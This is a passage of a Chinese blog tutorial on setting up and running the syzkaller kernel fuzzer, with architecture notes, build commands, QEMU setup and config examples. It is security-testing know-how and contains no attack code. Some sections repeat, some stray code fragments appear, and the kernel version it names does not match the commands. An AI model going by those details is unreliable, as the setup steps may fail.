文件包含原始日志，包括内核控制台输出以及在崩溃前执行的程序。可以将这些日志文件馈送给崩溃位置和最小化工具，或者用于手动定位。</p></li><li><p><strong>reportN</strong> 文件包含后处理和符号化的内核崩溃报告（例如KASAN报告）。通常你只需要一对这些文件（即log0和report0），因为它们通常描述相同的内核漏洞。但为了应对崩溃不容易重现的情况，Syzkaller最多会保存100对文件。</p></li><li><p>三种特殊的崩溃类型：</p></li></ul><ol><li><p><strong>测试机器没有输出</strong>：测试机器完全没有输出。</p></li><li><p><strong>与测试机器丢失连接</strong>：与机器的SSH连接意外断开。</p></li><li><p><strong>测试机器没有执行程序</strong>：机器看起来正常，但长时间没有执行测试程序。</p></li></ol><p>通常，您不会看到这些崩溃类型的文件（例如，如果测试机器没有输出，报告中没有数据）。有时这些崩溃本身可能是一个漏洞的指示（特别是如果在日志中看到Go的panic消息）。但通常，它们可能意味着内核死锁或类似的严重问题（例如：1、2、3等）。</p><h3 id="syz-manager"><a href="#syz-manager" class="headerlink" title="syz-manager"></a>syz-manager</h3><p><code>syz-manager</code> 是整个 syzkaller 系统的入口。以下是程序代码 <code>syz-manager/manager.go</code> 的一部分：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">RunManager</span><span class="hljs-params">(cfg *mgrconfig.Config)</span></span> &#123;<br><span class="hljs-comment">// 创建 VM</span><br>    vmPool, err = vm.Create(cfg, *flagDebug)<br>    <span class="hljs-comment">// ... 目录相关的处理</span><br>    <br>    <span class="hljs-comment">// 初始化各个子组件，名字比较自解释</span><br>reporter, err := report.NewReporter(cfg)<br>mgr := &amp;Manager&#123;...&#125;<br>mgr.preloadCorpus()<br>mgr.initStats()<br>mgr.initHTTP()<br>mgr.collectUsedFiles()<br>mgr.serv, err = startRPCServer(mgr)<br>    mgr.dash, err = dashapi.New(cfg.DashboardClient, cfg.DashboardAddr, cfg.DashboardKey)<br><br>    <span class="hljs-comment">// 每 10 秒在终端打印执行状态</span><br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> lastTime := time.Now(); ; &#123;<br>time.Sleep(<span class="hljs-number">10</span> * time.Second)<br>            <span class="hljs-comment">// ... 一些统计数据</span><br>corpusCover := mgr.stats.corpusCover.get()<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;VMs %v, executed %v, cover %v, ...&quot;</span>, numFuzzing, executed, corpusCover, ...)<br>&#125;<br>&#125;()<br>    <span class="hljs-comment">// 定期更新 dashboard 的线程</span><br>    <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>        <span class="hljs-keyword">for</span> &#123;<br>            time.Sleep(<span class="hljs-number">10</span> * time.Second)<br>            <span class="hljs-comment">// 更新数据</span><br>            mgr.dash.UpdateStats(&amp;mgr.stats)<br>        &#125;<br>    &#125;()<br>&#125;<br></code></pre></td></tr></table></figure><p><code>RunManager</code> 函数负责初始化整个系统，包括创建虚拟机、收集统计数据、启动 HTTP 服务和管理状态更新。主要组件包括：</p><ul><li>VM池管理（创建和销毁虚拟机）</li><li>报告生成和数据展示</li><li>统计信息收集</li><li>HTTP 接口</li></ul><p>当 syscalls 和数据源被配置好后，<code>syz-manager</code> 会启动一个 <code>RunManager</code> 过程来初始化所有资源并开始工作。</p><hr><p>这只是 <code>syzkaller</code> 工具链的一个简要介绍。如果你希望更详细地学习，可以逐步研究 syzlang 的具体用法以及如何配置与管理你的 fuzz 测试环境。</p><h3 id="syz-executor"><a href="#syz-executor" class="headerlink" title="syz-executor"></a>syz-executor</h3><p>Syzkaller使用一种特殊的数据结构来存储程序，各个组件之间都使用这种结构来传递程序，这种结构能够将程序序列化成类似C语言函数调用的形式：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">r0 = <span class="hljs-built_in">open</span>(&amp;(<span class="hljs-number">0</span>x7f0000000000)=<span class="hljs-string">&quot;./file0&quot;</span>, <span class="hljs-number">0</span>x3, <span class="hljs-number">0</span>x9)<br><span class="hljs-function"><span class="hljs-title">read</span><span class="hljs-params">(r0, &amp;(<span class="hljs-number">0</span>x7f0000000000)</span></span>, <span class="hljs-number">42</span>)<br><span class="hljs-function"><span class="hljs-title">close</span><span class="hljs-params">(r0)</span></span><br></code></pre></td></tr></table></figure><p>程序传给<code>syz-executor</code>后，<code>syz-executor</code>内部会将程序解析成系统调用的形式来执行。</p><p><code>syz-executor</code>的源代码路径为<code>executor/executor.cc</code>，它是用C++编写的程序，实际上大部分代码是C语言实现的，只有</p><p>少数是用C++实现的。</p><p><code>syz-manager</code>负责：</p><ul><li>启动&#x2F;重启&#x2F;监控 VM 实例</li><li>实际的模糊测试过程（输入生成、更改、最小化等）</li><li>持久语料库和崩溃存储</li></ul><p>它在具有稳定内核的主机上运行，该内核不会遇到白噪声模糊测试程序负载。</p><p><code>syz-manager</code>启动进程（每个 VM 内一个）。与 RPC 合并以接收必须执行的程序并报告结果（错误状态、收集的覆盖率等）。<code>syz-executor</code> <code>syz-executor</code> <code>syz-manager</code></p><p>要执行程序，请启动瞬态子进程。<code>syz-executor</code></p><p>每个瞬态子进程执行单个输入（一系列系统调用）。它被设计得尽可能简单（不干扰模糊测试过程），用 C++ 编写，编译为静态二进制文件，并使用共享内存进行通信。</p><p><strong>syscall描述</strong></p><p><strong>覆盖</strong></p><p>syzkaller 是一种覆盖率引导的模糊测试程序。</p><p><strong>崩溃报告</strong></p><p>找到崩溃程序时，它会将有关它的信息保存到目录中。该目录包含每个唯一崩溃类型的一个子目录。每个子目录都包含一个文件，该文件带有标识崩溃的唯一字符串（用于错误识别和重复数据删除）;以及最多 100 个文件，每个测试机器崩溃一对：</p><p><code>syzkaller``workdir/crashes``description``logN``reportN</code></p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-bullet">-</span> <span class="hljs-string">crashes/</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">6e512290efa36515a7a27e53623304d20d1c3e</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">description</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">log0</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">report0</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">log1</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">report1</span><br>    ...<br>  <span class="hljs-bullet">-</span> <span class="hljs-string">77c578906abe311d06227b9dc3bffa4c52676f</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">description</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">log0</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">report0</span><br>    ...<br></code></pre></td></tr></table></figure><p>描述是使用一组<a href="https://github.com/google/syzkaller/blob/master/pkg/report">正则表达式</a>提取的。如果您使用的是不同的内核架构，或者只是看到以前未见过的内核错误消息，则可能需要扩展此集合。</p><p><code>logN</code>文件包含原始日志，包括内核控制台输出以及崩溃前执行的程序。这些日志可以馈送到工具以进行<a href="https://github.com/google/syzkaller/blob/master/docs/reproducing_crashes.md">崩溃定位和最小化</a>，或用于<a href="https://github.com/google/syzkaller/blob/master/docs/reproducing_crashes.md#from-execution-logs">手动定位</a>的工具。文件包含经过后处理和符号化的内核崩溃报告（例如 KASAN 报告）。通常，您只需要 1 对这些文件（即和 ），因为它们可能都描述了相同的内核错误。但是，当崩溃的可重复性不佳时，或者如果您只想查看一组崩溃报告来推断一些相似之处或不同之处，最多可保存 100 个文件。<code>syzkaller``syz-repro``syz-execprog``reportN``log0``report0``syzkaller</code></p><p>有 3 种特殊类型的崩溃：</p><ul><li><code>no output from test machine</code>：测试机器不产生任何输出</li><li><code>lost connection to test machine</code>：与本机的 SSH 连接意外关闭</li><li><code>test machine is not executing programs</code>：计算机看起来处于活动状态，但长时间没有执行任何测试程序</li></ul><p>很可能你不会看到这些崩溃的文件（例如，如果测试机器没有输出，则没有什么可以放入报告中）。 有时，这些崩溃本身表明存在错误（尤其是当您在日志中看到 Go panic 消息时）。 然而，它们通常意味着内核锁定或类似的坏情况（以下是以这种方式发现的 bug 的几个示例：<a href="https://groups.google.com/d/msg/syzkaller/zfuHHRXL7Zg/Tc5rK8bdCAAJ">1</a>、<a href="https://groups.google.com/d/msg/syzkaller/kY_ml6TCm9A/wDd5fYFXBQAJ">2</a>、<a href="https://groups.google.com/d/msg/syzkaller/OM7CXieBCoY/etzvFPX3AQAJ">3</a>）。<code>reportN``syzkaller</code></p><h3 id="Syzkaller-架构"><a href="#Syzkaller-架构" class="headerlink" title="Syzkaller 架构"></a>Syzkaller 架构</h3><ol><li>syz-manager</li></ol><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">启动，控制，重启<span class="hljs-keyword">vm</span><br>通过ssh将syz-manager复制到<span class="hljs-keyword">vm</span>，并运行<br>保存语料库<br></code></pre></td></tr></table></figure><ol start="2"><li>sys-fuzzer</li></ol><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs protobuf">变异输入数据<br>运行syz-executor<br>通过<span class="hljs-function"><span class="hljs-keyword">rpc</span>将触发新路径的数据传回syz-manager</span><br></code></pre></td></tr></table></figure><ol start="3"><li>syz-executor</li></ol><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">运行系统调用<br></code></pre></td></tr></table></figure><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>我们要使用 Syzkaller 进行 Linux 内核的 Fuzz 需要以下环境：</p><ul><li>编译 Syzkaller 项目</li><li>Linux 内核</li><li>一台物理&#x2F;虚拟机</li></ul><h3 id="编译Syzkaller"><a href="#编译Syzkaller" class="headerlink" title="编译Syzkaller"></a>编译Syzkaller</h3><p>安装 Go 编译器和 C 编译器。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 下载 Go 1.23.7</span><br>wget https://go.dev/dl/go1.23.7.linux-amd64.tar.gz<br><br><span class="hljs-comment"># 解压到 /usr/local（需要 sudo 权限）</span><br><span class="hljs-built_in">sudo</span> tar -C /usr/local -xzf go1.23.7.linux-amd64.tar.gz<br><br><span class="hljs-comment"># 设置环境变量（只在当前 shell 有效）,建议添加进.bashrc文件</span><br><span class="hljs-built_in">export</span> GOROOT=/usr/local/go<br><span class="hljs-built_in">export</span> GOPATH=<span class="hljs-variable">$HOME</span>/go<br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$GOROOT</span>/bin:<span class="hljs-variable">$GOPATH</span>/bin:<span class="hljs-variable">$PATH</span><br><br><span class="hljs-built_in">sudo</span> apt install gcc<br><br><span class="hljs-comment"># 不开代理建议配置Go国内代理</span><br><span class="hljs-built_in">export</span> GOPROXY=https://goproxy.cn,direct<br></code></pre></td></tr></table></figure><p>安装所需的依赖：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">安装所需的依赖</span><br>sudo apt update<br>sudo apt install build-essential clang llvm libncurses5-dev libssl-dev libelf-dev bc<br>sudo apt install make flex bison libncurses-dev libelf-dev libssl-dev<br></code></pre></td></tr></table></figure><p>编译syzkaller：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/google/syzkaller<br><span class="hljs-built_in">cd</span> syzkaller<br>make<br></code></pre></td></tr></table></figure><p>如果我们需要对其它架构下的目标进行 Fuzz，那么我们需要进行交叉编译。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">如 arm 架构的目标</span><br>make CC=aarch64-linux-gnu-g++ TARGETARCH=arm64<br></code></pre></td></tr></table></figure><p>编译完成后，生成的执行文件会放在<code>syzkaller/bin/</code>目录中。</p><h3 id="编译-Linux-内核"><a href="#编译-Linux-内核" class="headerlink" title="编译 Linux 内核"></a>编译 Linux 内核</h3><p>以内核版本 5.14 为例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> --branch v5.15 git://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git<br><br><span class="hljs-built_in">cd</span> linux-5.15<br>make defconfig         <span class="hljs-comment"># 生成默认配置（根据架构）</span><br>make kvm_guest.config  <br></code></pre></td></tr></table></figure><p>syzkaller 所需的功能主要是启用 <code>KCOV</code> 来收集内核 coverage，并启用 <code>KASAN</code> 来检测内存错误：</p><p>修改配置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim .config<br></code></pre></td></tr></table></figure><p>添加以下选项，这些都是为了让内核更好的被 Fuzz。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">Coverage collection.</span>  <br>CONFIG_KCOV=y  <br><span class="hljs-meta prompt_">  </span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">显示覆盖率图像</span><br>CONFIG_DEBUG_INFO=y  <br><span class="hljs-meta prompt_">  </span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Memory bug detector</span>  <br>CONFIG_KASAN=y  <br>CONFIG_KASAN_INLINE=y  <br><span class="hljs-meta prompt_">  </span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Required <span class="hljs-keyword">for</span> Debian Stretch</span>  <br>CONFIG_CONFIGFS_FS=y  <br>CONFIG_SECURITYFS=y<br></code></pre></td></tr></table></figure><p>重新生成配置文件并编译：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">修改完成后更新配置</span><br>make olddefconfig<br><span class="hljs-meta prompt_">#</span><span class="language-bash">编译</span><br>make -j$(nproc)<br></code></pre></td></tr></table></figure><p>编译后：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><h3 id="Qemu-配置"><a href="#Qemu-配置" class="headerlink" title="Qemu 配置"></a>Qemu 配置</h3><p>我们通过 Qemu 来运行 Linux 内核。</p><ul><li>安装 qemu</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt install qemu-system-x86<br></code></pre></td></tr></table></figure><ul><li>创建 Image</li></ul><p>创建一个 Debian Stretch Linux 镜像，作为 VM 的文件系统：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install debootstrap<br><br><span class="hljs-comment">#设置 IMAGE 为 Linux 项目路径</span><br><span class="hljs-built_in">export</span> IMAGE=<span class="hljs-string">&quot;/linux&quot;</span><br><span class="hljs-built_in">mkdir</span> <span class="hljs-variable">$IMAGE</span><br><span class="hljs-built_in">cd</span> <span class="hljs-variable">$IMAGE</span>/<br><span class="hljs-comment">#复制syzkaller项目tools目录下的create-image.sh文件</span><br>wget https://raw.githubusercontent.com/google/syzkaller/master/tools/create-image.sh -O create-image.sh  <br><span class="hljs-built_in">chmod</span> +x create-image.sh<br><span class="hljs-comment">#Linux 项目不能存在于挂载目录上，否则会报错</span><br>./create-image.sh<br></code></pre></td></tr></table></figure><p>当前目录下多了几个文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">❯ ls<br>bullseye  bullseye.id_rsa  bullseye.id_rsa.pub  bullseye.img  create-image.sh<br></code></pre></td></tr></table></figure><ul><li>启动虚拟机</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">qemu-system-x86_64 \  <br>  -m 2G \  <br>  -smp 2 \  <br>  -kernel /usr/class/linux/arch/x86/boot/bzImage \  <br>  -append &quot;console=ttyS0 root=/dev/sda earlyprintk=serial net.ifnames=0&quot; \  <br>  -drive file=/usr/class/linux/image/stretch.img,format=raw \  <br>  -net user,host=10.0.2.10,hostfwd=tcp:127.0.0.1:10021-:22 \  <br>  -net nic,model=e1000 \  <br>  -enable-kvm \  <br>  -nographic \  <br>  -pidfile vm.pid \  <br><span class="hljs-meta prompt_">  2&gt;</span><span class="language-bash">&amp;1 | <span class="hljs-built_in">tee</span> vm.log</span><br></code></pre></td></tr></table></figure><p>如果成功的话，就会出现 syzkaller login。用户名键入<code>root</code>，无需输入密码，即可进入终端：</p><p>我们测试 ssh 是否正常工作，因为我们的 syzkaller 是通过 ssh 传输文件的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh -i /root/linux/image/bullseye.id_rsa -p 10021 -o &quot;StrictHostKeyChecking no&quot; root@localhost<br></code></pre></td></tr></table></figure><p>通过<code>poweroff</code>我们可以退出模拟的系统。</p><h2 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h2><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><ul><li>设置配置文件</li></ul><p>为  Syzkaller 创建一个配置文件<code>my.cfg</code>，这个配置文件将指定一些参数，如目标内核、内核调试符号、执行的测试类型等。</p><p>当以上环境搭建完成后，就可以开始编写 syzkaller 的配置文件。以下是官方的配置示例：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># my.cfg</span><br>&#123;<br>  <span class="hljs-attr">&quot;target&quot;:</span> <span class="hljs-string">&quot;linux/amd64&quot;</span>,<br>  <span class="hljs-attr">&quot;http&quot;:</span> <span class="hljs-string">&quot;127.0.0.1:56741&quot;</span>,<br>  <span class="hljs-attr">&quot;workdir&quot;:</span> <span class="hljs-string">&quot;/root/linux/workdir/&quot;</span>,<br>  <span class="hljs-attr">&quot;kernel_obj&quot;:</span> <span class="hljs-string">&quot;/root/linux/&quot;</span>,<br>  <span class="hljs-attr">&quot;image&quot;:</span> <span class="hljs-string">&quot;/root/linux/image/bullseye.img&quot;</span>,<br>  <span class="hljs-attr">&quot;sshkey&quot;:</span> <span class="hljs-string">&quot;/root/linux/image/bullseye.id_rsa&quot;</span>,<br>  <span class="hljs-attr">&quot;syzkaller&quot;:</span> <span class="hljs-string">&quot;/tools/binary/syzkaller/&quot;</span>,<br>  <span class="hljs-attr">&quot;procs&quot;:</span> <span class="hljs-number">8</span>,<br>  <span class="hljs-attr">&quot;type&quot;:</span> <span class="hljs-string">&quot;qemu&quot;</span>,<br>  <span class="hljs-attr">&quot;vm&quot;:</span> &#123;<br>    <span class="hljs-attr">&quot;count&quot;:</span> <span class="hljs-number">4</span>,<br>    <span class="hljs-attr">&quot;kernel&quot;:</span> <span class="hljs-string">&quot;/root/linux/arch/x86/boot/bzImage&quot;</span>,<br>    <span class="hljs-attr">&quot;cmdline&quot;:</span> <span class="hljs-string">&quot;net.ifnames=0&quot;</span>,<br>    <span class="hljs-attr">&quot;cpu&quot;:</span> <span class="hljs-number">2</span>,<br>    <span class="hljs-attr">&quot;mem&quot;:</span> <span class="hljs-number">2048</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">syz-manager -config=my.cfg<br></code></pre></td></tr></table></figure><ul><li><strong>http</strong> - 用户界面开放在本地的 56741 端口</li><li><strong>image</strong> - 先前生成的镜像路径</li><li><strong>syzkaller</strong> - syzkaller 项目的根目录，这里会根据安装 syzkaller 的方式有所不同</li></ul><p>接下来是一些 VM 配置，比如 VM 使用 QEMU 运行、启用四台 VM，每台的硬件资源和 kernel image 路径等。</p><p>一但 syzkaller 在其中一个 VM 中检测到内核崩溃，它将自动重现此崩溃的过程。默认情况下，它将使用 4 个 VM 来重新崩溃，然后最小化导致崩溃的重新。</p><h3 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h3><p>执行以下命令来运行 syzkaller：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">syz-manager -config=my.cfg<br></code></pre></td></tr></table></figure><p>执行后访问用户界面 <a href="http://localhost:56741/">http://localhost:56741</a> (默认)，你将看到以下界面，代表执行成功：</p><p><img src="/Linux/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/assets/26-1.png" alt="img"></p><p>通过加上<code>-debug</code>参数可以排查 syzkaller 运行失败的问题，参数会展示<code>syz-executor</code>的执行情况。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">syz-manager -config configure.json --debug<br></code></pre></td></tr></table></figure><p>在宿主机运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ps -aux | grep qemu<br></code></pre></td></tr></table></figure><p>该命令会显示<code>syz-manager</code>传给 qemu 的选项，一些不合适的参数可能会导致<code>syz-manager</code>报错。你可以修改这些参数并手动运行 qemu 进行排查。一部分参数来自配置文件，另一部分为默认值，位于 <code>syzkaller/vm/qemu/qemu.go</code>。你可以修改源码并重新构建以适配你的机器环境。</p><p>检查是否可以 ssh 连接到虚拟机</p><p>扩展系统调用（syscall）</p><p>我主要在 Linux&#x2F;X86_64 平台上使用 syzkaller。将你新增的 syscall 描述写入 <code>$(SYZKALLER)/sys/linux/*.txt</code>，然后运行：</p><p>make HOSTOS&#x3D;linux HOSTARCH&#x3D;amd64 TARGETOS&#x3D;linux TARGETARCH&#x3D;amd64 SOURCEDIR&#x3D;$(YOUR_KERNEL_SOURCE_DIR) extract<br>make HOSTOS&#x3D;linux HOSTARCH&#x3D;amd64 TARGETOS&#x3D;linux TARGETARCH&#x3D;amd64 SOURCEDIR&#x3D;$(YOUR_KERNEL_SOURCE_DIR) generate<br>make HOSTOS&#x3D;linux HOSTARCH&#x3D;amd64 TARGETOS&#x3D;linux TARGETARCH&#x3D;amd64 SOURCEDIR&#x3D;$(YOUR_KERNEL_SOURCE_DIR) -jN</p><p>这会使用你自定义的 syscall 重建 syzkaller。然后用 <code>scp</code> 将编译后的二进制文件拷贝到 VM 中。</p><h4 id="使用-systemtap-监控远程-VM"><a href="#使用-systemtap-监控远程-VM" class="headerlink" title="使用 systemtap 监控远程 VM"></a>使用 systemtap 监控远程 VM</h4><p>我使用 systemtap 来验证 fuzzer 执行后代码是否可达。你可以通过编写自己的 <code>.stap</code> 脚本来扩展功能。 <a href="https://github.com/hardenedlinux/Debian-GNU-Linux-Profiles/blob/master/docs/harbian_qa/systemtap.md">这是一个使用 systemtap 监控远程 VM 的教程</a>，<a href="https://chatgpt.com/c/6829fdb6-008c-8003-aec2-7b77b5b0f522">这是一个示例</a>展示了 fuzzer 触发某个内核处理函数的次数。</p><h4 id="KCOV（覆盖率）"><a href="#KCOV（覆盖率）" class="headerlink" title="KCOV（覆盖率）"></a>KCOV（覆盖率）</h4><p>syzkaller 使用 KCOV 收集覆盖信息。每个实例都会初始化 KCOV 接口，接口位于 <code>/sys/kernel/debug/kcov</code>，通过 <code>ioctl</code> 启用&#x2F;禁用。实现代码在 <code>executor/executor_linux.cc</code> 中，一系列 <code>cover_*</code> 函数负责处理。</p><p>注意：为了获得完整的调试信息，<code>syz-manager</code> 的配置文件中必须指定正确的 vmlinux 文件。你可以通过访问 syzkaller 的 Web 服务查看覆盖信息：</p><p><a href="http://127.0.0.1:$(PORT)/cover">http://127.0.0.1:$(PORT)/cover</a></p><p>KCOV 会用不同颜色显示已覆盖的分支。内核模块的覆盖信息未包含在内。</p><h4 id="故障注入（Fault-injection）"><a href="#故障注入（Fault-injection）" class="headerlink" title="故障注入（Fault-injection）"></a>故障注入（Fault-injection）</h4><p>syzkaller 在运行时使用内存管理相关的失败注入机制。另一种有用的注入方式是向指定的内核函数注入错误返回值。这是通过 kprobe + sysfs 实现的，对用户空间暴露了 <code>/sys/kernel/debug/fail_function</code> 接口。</p><p>syzkaller 使用的故障注入代码位于： <code>$SYZ_SRC/pkg/host/host_linux.go</code></p><h3 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h3><p>模板语法：</p><p>内核fuzz模型：</p><ul><li>制导</li><li>崩溃重启 我们通过虚拟机来运行内核，如果内核崩溃即重新启动虚拟机</li><li>交互 fuzz &lt;&#x3D;&gt; 目标程序 获取目标进程运行状态 syzkaller通过ssh与内核交互</li><li>样本什么格式，如何让内核解析它？生成二进制文件</li><li>投喂样本 执行二进制</li></ul><p>内核态如何插桩？kcov</p><p>如何将内核的代码覆盖率情况反馈给主 fuzz程序。</p><p>被 kcov 编译的内核运行起来后，会生成一个 kcov 文件，通过这个文件我们可以知道当前内核的代码执行情况。</p><p>目标：未授权写特权文件</p><p>特征：普通用户+只读文件 &#x3D;&gt; 文件内容发生变化</p><p>解决：普通用户执行+自建只读文件</p><p>syzkaller 通过生成二进制文件然后通过 ssh 服务传输到目标内核中运行来 fuzz</p><h2 id="syzlang"><a href="#syzlang" class="headerlink" title="syzlang"></a>syzlang</h2><p>syzkaller 自己定义了一套描述系统调用模板的声明式语言，我们称之为描述文件。</p><p>为了提高 fuzz 的效率，我们必须为目标系统量身定制这种声明文件。通常一个设备节点对应一个声明文件。</p><p>所谓的声明文件就是一个 txt，根据syzkaller定义的语法，在这个txt文档中描述设备节点的接口信息以及参数格式。</p><h3 id="syzlang-1"><a href="#syzlang-1" class="headerlink" title="syzlang"></a>syzlang</h3><p>syzkaller 自定义了一种语言 syzlang 来描述系统调用（syscall）的格式，比如 syscall 编号、参数、返回类型等，<a href="https://github.com/google/syzkaller/blob/master/docs/syscall_descriptions.md">官方文档</a>已经详细说明了格式，这里提供一个简洁的中文懒人包。</p><p>首先，我们可以参考现成的文件 <code>sys/linux/sys.txt</code>，该文件开头会包含一些 kernel header 